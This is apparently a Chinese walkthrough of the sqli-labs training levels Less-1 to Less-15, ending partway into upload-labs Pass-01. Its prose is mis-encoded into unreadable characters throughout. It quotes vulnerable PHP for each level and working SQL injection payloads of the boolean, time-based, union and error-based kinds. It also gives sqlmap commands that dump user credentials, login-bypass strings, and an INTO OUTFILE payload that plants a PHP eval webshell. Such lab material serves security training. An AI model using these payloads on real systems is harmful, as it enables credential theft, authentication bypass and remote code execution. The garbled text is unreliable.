å¸ƒå°”ç›²æ³¨ ?id=1' and left(database(),1)&gt;'r'--+ ?id=1' and left(database(),1)&gt;'s'--+ æ—¶é—´ç›²æ³¨ ?id=1' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+ ?id=1' and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ sqlmap è”åˆæ³¨å…¥ python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=U -v3 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session -D security -T users -C username --dump python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session -D security -T users -C password --dump æŠ¥é”™æ³¨å…¥ python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=E -v3 å¸ƒå°”ç›²æ³¨ python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=B -v3 å»¶æ—¶ç›²æ³¨ python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=T -v3 Less-2 å…³é”®ä»£ç å¦‚ä¸‹ &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œåªä¸è¿‡å‚æ•°idè¿™æ¬¡ä¸ºæ•°å­—ç±»å‹ï¼Œé—­åˆæ–¹å¼ä¸ä¸€æ ·è€Œå·²ã€‚ä¸åœ¨èµ˜è¿°äº† Less-3 å…³é”®ä»£ç å¦‚ä¸‹ &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } åŒæ ·çš„ï¼Œè¿™æ¬¡é—­åˆæ–¹å¼ä¸ºå•å¼•å·+æ‹¬å·ï¼Œå…¶ä½™ä¸å˜ Less-4 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $id = '\"' . $id . '\"'; $sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } ä¹Ÿæ˜¯ç›¸åŒé“ç†ï¼Œä¸è¿‡åœ¨æ’å…¥SQLè¯­å¥ä¹‹å‰ï¼Œå¯¹idå‚æ•°å†…å®¹è¿›è¡Œäº†åŒå¼•å·çš„æ‹¼æ¥ï¼Œçœ‹ä¼¼å¤æ‚ï¼Œå…¶å®å°±æ˜¯å°†é—­åˆæ–¹å¼æ¢ä¸ºäº†åŒå¼•å·+æ‹¬å· Less-5 å…³é”®ä»£ç å¦‚ä¸‹ &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } è¿™é‡Œçš„é—­åˆæ–¹å¼æ¢ä¸ºäº†å•å¼•å·é—­åˆï¼Œä½†æ˜¯ä¸ä¹‹å‰å››å…³ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€å…³ä¸èƒ½é‡‡ç”¨è”åˆæ³¨å…¥äº†ï¼Œå› ä¸ºä»£ç ä¸­ä¸ä¼šè¾“å‡ºæœ‰å…³æŸ¥è¯¢ç»“æœçš„ä¿¡æ¯ Less-6 å…³é”®ä»£ç å¦‚ä¸‹ &lt;?php if(isset($_GET['id'])) { $id=$_GET['id']; // connectivity $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"3\" color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } ä¸Less-5ç±»ä¼¼ï¼Œåªæ˜¯æ›´æ¢é—­åˆæ–¹å¼ä¸ºåŒå¼•å·äº† Less-7 å…³é”®ä»£ç å¦‚ä¸‹ &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } è¿™é‡Œåˆè¿›è¡Œäº†å˜åŠ¨ï¼Œé¦–å…ˆæ˜¯é—­åˆæ–¹å¼æ”¹ä¸ºäº†å•å¼•å·+åŒæ‹¬å·æ–¹å¼ï¼Œå…¶æ¬¡å°†mysql_error()æ³¨é‡Šæ‰äº†ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½è¿›è¡Œè”åˆæ³¨å…¥ä¸æŠ¥é”™æ³¨å…¥ï¼Œåªèƒ½è¿›è¡Œæ—¶é—´å’Œå¸ƒå°”ç›²æ³¨ã€‚å¯ä»¥æ‰‹å·¥éªŒè¯åï¼Œç›´æ¥sqlmapè·‘ ç›²æ³¨ å¸ƒå°”ç›²æ³¨ python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-7/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=B -v3 Payload: id=1') AND 8283=8283 AND ('xwjv'='xwjv æ—¶é—´ç›²æ³¨ python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-7/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=T -v3 Payload: id=1') AND (SELECT 3626 FROM (SELECT(SLEEP(5)))Nmqc) AND ('PMsB'='PMsB å¯¼å‡ºæ•°æ®åˆ°æ–‡ä»¶ echo 'You are in.... Use outfile......'; æ ¹æ®ä¸Šè¿°ä½œè€…çš„æç¤ºï¼Œæˆ‘ä»¬å°è¯•å°†æ•°æ®åº“æ•°æ®å¯¼å…¥åˆ°æ–‡ä»¶è¿›è¡Œè¯»å– åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æ•°æ®åº“ç¯å¢ƒå˜é‡ï¼š mysql&gt; show global variables like '%secure%'; +--------------------------+-------+ | Variable_name | Value | +--------------------------+-------+ | require_secure_transport | OFF | | secure_auth | ON | | secure_file_priv | | +--------------------------+-------+ 3 rows in set (0.04 sec) ure_file_priv çš„å€¼ä¸º null ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥ | å¯¼å‡º å½“ secure_file_priv çš„å€¼ä¸º /tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥ | å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨ /tmp/ ç›®å½•ä¸‹ å½“ secure_file_priv çš„å€¼ä¸º ç©º æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥ | å¯¼å‡ºåšé™åˆ¶ å¯è§æˆ‘ä»¬è¿™é‡Œæ˜¯ç©ºçš„ï¼Œå› æ­¤å¯ä»¥è¿›è¡Œå¯¼å…¥å¯¼å‡º ?id=1')) union select * from security.users into outfile 'D:\\\\labwork\\\\phpstudy_pro\\\\WWW\\\\sqllabs\\\\Less-7\\\\users.txt'--+ è¿™é‡Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šå¯¼å‡ºè·¯å¾„ï¼Œå½“ç„¶æˆ‘è¿™é‡Œæ˜¯Windowsä¸‹ï¼Œå¦‚æœåœ¨linuxä¸‹ä¸æŒ‡å®šè·¯å¾„ï¼Œåˆ™é»˜è®¤mysqlçš„å¯¼å‡ºè·¯å¾„ä¸ºï¼š /var/lib/mysql/security è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°å¯¼å‡ºæˆåŠŸ ä½†ä¸€èˆ¬è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å‘Webç›®å½•å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œé€šå¸¸æ˜¯ç›´æ¥å†™shell ?id=1')) union select 1,2,\"&lt;?php @eval($_POST['hybcx']);?&gt;\" into outfile 'D:\\\\labwork\\\\phpstudy_pro\\\\WWW\\\\sqllabs\\\\Less-7\\\\shell.php'--+ å¯ä»¥çœ‹åˆ°å†™å…¥æˆåŠŸ Less-8 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } ä¸Less-7ç±»ä¼¼ï¼Œåªä¸è¿‡é—­åˆæ–¹å¼æ”¹ä¸ºäº†å•å¼•å·é—­åˆã€‚ Less-9 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } è¿™ä¸€å…³ä¹Ÿè¿›è¡Œäº†è¾ƒä¸ºæ˜æ˜¾çš„æ”¹åŠ¨ï¼Œé‚£å°±æ˜¯æ— è®ºæ‰§è¡ŒSQLè¯­å¥ä¹‹åï¼Œæ˜¯å¦æˆåŠŸï¼Œé¡µé¢å›æ˜¾æƒ…å†µéƒ½ä¸€è‡´ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½è¿›è¡Œæ—¶é—´ç›²æ³¨ã€‚ Less-10 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } ä¸Less-9ç±»ä¼¼ï¼Œä½†å‚æ•°idé—­åˆæ–¹å¼æ”¹ä¸ºäº†åŒå¼•å· Less-11 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; è¿™ä¸€å…³æ•´ä½“æ¡†æ¶å¦‚åŒLess-1ä¸€èˆ¬ï¼Œåªä¸è¿‡æ³¨å…¥ç‚¹å‘ç”Ÿåœ¨äº†formè¡¨å•å¤„ï¼Œä¹Ÿå°±æ˜¯postå‹æ³¨å…¥ã€‚ çœ‹ä»£ç å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå¯¹usernamä¸passwordå‚æ•°æ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ã€‚ ä¸‡èƒ½å¯†ç  ä¸€èˆ¬è¿™ç§è¡¨å•å¤„ï¼Œæœ€ç®€å•çš„æ¼æ´å°±æ˜¯ä¸‡èƒ½å¯†ç çš„åˆ©ç”¨äº†ï¼Œè€Œè¿™é‡Œä¹Ÿæ˜¯å­˜åœ¨çš„ã€‚ uname=admin' or '1'='1&amp;passwd=asd&amp;submit=Submit å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›å…¥ï¼Œä¸”ä¸éœ€è¦è¾“å…¥æ­£ç¡®çš„å¯†ç ã€‚å…¶ä½™ç±»ä¼¼æ„é€ å¦‚ä¸‹ï¼š # æ³¨é‡Šæ‰ passwd æ¥ç™»å½• uname=admin'--+&amp;passwd=&amp;submit=Submit uname=admin'#&amp;passwd=&amp;submit=Submit # æ³¨é‡Šåé¢è¯­å¥ å¹¶ æ·»åŠ ä¸€ä¸ªæ°¸çœŸæ¡ä»¶ uname=admin&amp;passwd=1' or 1--+&amp;submit=Submit uname=admin&amp;passwd=1'||1--+&amp;submit=Submit uname=admin&amp;passwd=1' or 1#&amp;submit=Submit uname=admin&amp;passwd=1'||1#&amp;submit=Submit # é—­åˆåé¢è¯­å¥ å¹¶ æ·»åŠ ä¸€ä¸ªæ°¸çœŸæ¡ä»¶ uname=admin&amp;passwd=1'or'1'='1&amp;submit=Submit uname=admin&amp;passwd=1'||'1'='1&amp;submit=Submit è”åˆæ³¨å…¥ uname=1'union select 1,(select group_concat(username,0x7e,password)from users)#&amp;passwd=hybcx&amp;submit=Submit æŠ¥é”™æ³¨å…¥ uname=hybcx&amp;passwd=1'and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)-- mOVv&amp;submit=Submit --é”™è¯¯ä¾‹å­ uname=hybcx&amp;passwd=1' and updatexml(1,concat(0x7e,(select concat(username,0x7e,password)from users limit 0,1)),1)#&amp;submit=Submit --æ­£ç¡®ä¾‹å­ uname=hybcx&amp;passwd=1' union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x#&amp;submit=Submit --æ­£ç¡®ä¾‹å­ è¿™é‡Œæœ¬æƒ³ç€ç»§ç»­å°è¯•floorçš„æŠ¥é”™æ–¹å¼ï¼Œä½†è¿™é‡Œä¼¼ä¹å¹¶ä¸æ”¯æŒï¼Œæ‰¾äº†è¯¸å¤šæ–‡ç« ï¼Œå‘ç°å¤§æ¦‚æ˜¯select 1 fromä¸­çš„æ•°å­—1é—®é¢˜ï¼Œè¿™é‡Œçš„æ•°æ®åº“ä¼¼ä¹ä¸æ”¯æŒè¿™ç§æ–¹å¼ï¼Œselect 1çš„æ„æ€æ˜¯æŒ‡å®šæŸä¸€åˆ—ï¼š mysql&gt; select 1 from users; +---+ | 1 | +---+ | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | +---+ 13 rows in set (0.03 sec) è€Œè¿™é‡Œå¦‚æœä¸æ·»åŠ select 1 çš„è¯­å¥ï¼Œåˆ™ä¼šæˆåŠŸæŠ¥é”™ å¸ƒå°”ç›²æ³¨ uname=admin' and left(database(),1)&gt;'r'#&amp;passwd=&amp;submit=Submit uname=admin' and left(database(),1)&gt;'s'#&amp;passwd=&amp;submit=Submit æ—¶é—´ç›²æ³¨ uname=admin' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(4))#&amp;passwd=&amp;submit=Submit uname=admin' and if(ascii(substr(database(),1,1))&gt;115,1,sleep(4))#&amp;passwd=&amp;submit=Submit sqlmap ç›´æ¥æ‹¿å‡ºbpæŠ“åˆ°çš„æ•°æ®ï¼Œä¿å­˜ä¸ºtxtå³å¯ POST /sqllabs/Less-11/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 88 Origin: http://127.0.0.1 Connection: close Referer: http://127.0.0.1/sqllabs/Less-11/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 uname=test&amp;passwd=123&amp;submit=Submit ç„¶åç›´æ¥ä½¿ç”¨ sqlmap çš„ -r å‚æ•°æ¥åŠ è½½è¿™ä¸ªè¯·æ±‚åŒ…ï¼š python3 sqlmap.py -r res.txt ä¹Ÿå¯ä»¥æ‰‹åŠ¨é€šè¿‡ --data æ¥å¯¹ POST çš„æ•°æ®åŒ…å†…å®¹è¿›è¡Œæ³¨å…¥æ£€æµ‹ï¼š sqlmap -u \"http://127.0.0.1/sqllab/Less-11/\" --data=\"uname=admin&amp;passwd=2333&amp;submit=Submit\" å®é™…ä¸Š --data æ¯”è¾ƒé¸¡è‚‹ï¼Œæ“ä½œæ•ˆç‡æ¯”è¾ƒä½ã€‚ è”åˆæ³¨å…¥ python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=U -v3 æŠ¥é”™æ³¨å…¥ python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=E -v3 å¸ƒå°”ç›²æ³¨ python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=B -v3 æ—¶é—´ç›²æ³¨ python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=T -v3 Less-12 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname.\" \"); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity $uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œä¸è¿‡é—­åˆæ–¹å¼æ”¹ä¸ºäº†åŒå¼•å·+æ‹¬å·çš„æ–¹å¼ Less-13 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname.\" \"); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; //echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; //echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; ç”±äºè¿™é‡Œå°†æŸ¥è¯¢ç»“æœçš„è¾“å‡ºæ³¨é‡Šæ‰äº†ï¼Œæ„å‘³ç€æˆ‘ä»¬æ— æ³•è¿›è¡Œè”åˆæ³¨å…¥ã€‚å¹¶ä¸”é—­åˆæ–¹å¼æ”¹ä¸ºäº†å•å¼•å·+æ‹¬å· Less-14 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname.\" \"); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity $uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; //echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; //echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; ä¸Less-13ç±»ä¼¼ï¼Œåªæ˜¯é—­åˆæ–¹å¼æ”¹ä¸ºäº†åŒå¼•å·é—­åˆ Less-15 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; //print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; æ³¨é‡Šæ‰äº†mysql_errorå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½è¿›è¡Œå¸ƒå°”å’Œæ—¶é—´ç›²æ³¨äº†ã€‚åŒæ—¶é—­åˆæ–¹å¼ä¸ºå•å¼•å· 0x02 upload-labs Pass-01 function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\"); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = \".jpg|.png|.gif\"; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(\".\")); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = 